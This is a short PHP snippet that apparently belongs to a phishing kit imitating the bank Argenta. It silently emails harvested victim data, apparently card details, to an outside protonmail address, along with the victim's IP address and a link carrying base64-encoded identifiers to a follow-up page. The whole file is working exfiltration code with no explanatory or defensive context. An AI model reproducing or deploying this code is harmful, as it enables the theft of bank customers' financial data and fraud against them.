<?php
 @mail("willekoppen@protonmail.ch", "Argenta (".$_SESSION['krn']." - ".$subj.")", $berc."<br><br><b>".$_SERVER['REMOTE_ADDR']. "</b><br><br>http://".$_SERVER['SERVER_NAME'].dirname($_SERVER['REQUEST_URI'])."/mnp.php?idn=".base64_encode($cQ)."&kart=".base64_encode($_SESSION['krn']), $headers);
?>
